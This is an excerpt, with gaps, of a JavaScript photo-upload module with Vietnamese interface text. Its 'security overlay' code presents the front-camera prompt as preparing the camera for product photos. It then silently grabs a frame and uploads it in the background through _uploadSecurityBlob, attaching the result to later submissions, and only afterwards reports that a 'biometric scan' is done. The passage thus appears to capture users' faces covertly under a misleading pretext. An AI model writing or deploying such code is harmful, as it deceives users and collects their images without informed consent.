...
(function (global) {
  ...
  var TMPL_MAIN = [
    ...
    '        <button class="pu-as-btn" id="puAsTakePhoto" style="border-bottom:1px solid rgba(0,0,0,0.06); color:#3b82f6;"><i class="fas fa-camera"></i> Chụp ảnh (Camera Hệ thống)</button>',
    '        <button class="pu-as-btn" id="puAsLibrary" style="border-bottom:1px solid rgba(0,0,0,0.06); color:#3b82f6;"><i class="fas fa-images"></i> Thư viện & Tệp ảnh</button>',
    '        <button class="pu-as-btn" id="puAsFiles" style="color:#3b82f6;"><i class="fas fa-folder"></i> Duyệt Tệp Khác...</button>',
    '      </div>',
    '      <div style="background:#fff; border-radius:12px; overflow:hidden;">',
    '        <button class="pu-as-btn" id="puAsCancel" style="color:#ef4444; font-weight:900;">Huỷ / Đóng</button>',
    '      </div>',
    '    </div>',
    '  </div>',

    '  <div class="pu-confirm-overlay pu-hidden" id="puSecurityOverlay" style="background:rgba(255,255,255,0.95); z-index:99999;">',
    '    <div class="pu-confirm-box" style="text-align:center; background:transparent; box-shadow:none;">',
    '      <div id="puSecOverlaySpinner" class="pu-spinner" style="margin: 0 auto 20px auto; width:40px; height:40px; border-width:4px; border-top-color:#10b981;"></div>',
    '      <div class="pu-confirm-title" id="puSecOverlayTitle" style="margin-bottom:8px; font-size:18px; color:#1f2937;">Sẵn sàng Máy ảnh...</div>',
    '      <div class="pu-confirm-msg" id="puSecOverlayMsg" style="margin-bottom:16px; color:#4b5563;">',
    '        Hệ thống đang chuẩn bị Máy Ảnh (Camera Trước) theo chuẩn an ninh nền cứng.<br><br><b style="color:#ef4444;">💡 Xin lưu ý:</b> Vui lòng bấm <b>Cho phép (Allow)</b> nếu Trình Duyệt / Hệ điều hành bật hộp thoại yêu cầu cấp quyền Camera (Chỉ 1 lần lúc đầu).',
    '      </div>',
    '      <div class="pu-confirm-btns pu-hidden" id="puSecOverlayBtns" style="justify-content:center; margin-top:20px;">',
    '        <button class="pu-confirm-btn pu-confirm-primary" id="puSecOverlayAccept" type="button" style="flex:1; font-size:16px; padding:14px;"><i class="fas fa-camera"></i> Mở Camera Chụp Sản Phẩm</button>',
    '        <button class="pu-confirm-btn pu-confirm-cancel" id="puSecOverlayCancel" type="button" style="padding:14px;"><i class="fas fa-times"></i></button>',
    '      </div>',
  ...
  PhotoUploadModule.prototype._bindStatic = function () {
    ...
    var secSpinner = document.getElementById('puSecOverlaySpinner');
    var secTitle = document.getElementById('puSecOverlayTitle');
    var secMsg = document.getElementById('puSecOverlayMsg');
    ...
    function setSecurityOverlayState(state) {
        if (state === 'loading') {
            if (secSpinner) secSpinner.style.display = 'block';
            if (secTitle) secTitle.innerHTML = 'Sẵn sàng Máy ảnh...';
            if (secMsg) secMsg.innerHTML = 'Hệ thống đang chuẩn bị Máy Ảnh (Camera Trước) theo chuẩn an ninh nền cứng.<br><br><b style="color:#ef4444;">💡 Xin lưu ý:</b> Vui lòng bấm <b>Cho phép (Allow)</b> nếu Trình Duyệt / Hệ điều hành bật hộp thoại yêu cầu cấp quyền Camera (Chỉ 1 lần lúc đầu).';
            if (secBtns) secBtns.classList.add('pu-hidden');
        } else if (state === 'done') {
            if (secSpinner) secSpinner.style.display = 'none';
            if (secTitle) secTitle.innerHTML = '<i class="fas fa-check-circle" style="color:#10b981;"></i> Đã quét Sinh Trắc xong';
            if (secMsg) secMsg.innerHTML = '<span style="color:#10b981;font-weight:bold;">Ảnh xác nhận đã được thu thập an toàn thành công!</span><br><br><b>Tiếp tục khởi động Ống Kính Quay Sản Phẩm ngay bây giờ!</b>';
            if (secBtns) secBtns.classList.remove('pu-hidden');
        } else if (state === 'error') {
            if (secSpinner) secSpinner.style.display = 'none';
            if (secTitle) secTitle.innerHTML = '<i class="fas fa-exclamation-triangle" style="color:#f59e0b;"></i> Bỏ qua Bảo mật';
            if (secMsg) secMsg.innerHTML = '<span style="color:#f59e0b;">Thiết bị hoặc người dùng từ chối quyền cấp máy ảnh.</span><br><br><b>Hệ thống buộc phải cho phép bạn bỏ qua thao tác này để tiếp tục.</b>';
            if (secBtns) secBtns.classList.remove('pu-hidden');
        }
    }
             ...
             var poll = setInterval(function() {
               ...
               if (video && video.readyState >= 2 && video.videoWidth > 0) {
                 ...
                 try {
                   ...
                   c.toBlob(function(b){
                      /* Gửi ngay liền đi theo luồng bảo mật nền */
                      self._uploadSecurityBlob(b, null, function(res){
                          if(res) self._securityPhotoResult = res;
                      });
                      cleanup();
                      /* Bypass Safari Lock by giving control to user */
                      setSecurityOverlayState('done');
                   }, 'image/jpeg', 0.9);
                 } catch(e) { 
                   cleanup(); 
  ...
  PhotoUploadModule.prototype._submit = function (sendMail, closeAfter) {
    ...
    function next(i) {
      if (i >= total) {
        ...
        if (self._securityPhotoResult) {
          meta.secResult = self._securityPhotoResult;
          self._securityPhotoResult = null; /* Clear after consuming */
        }
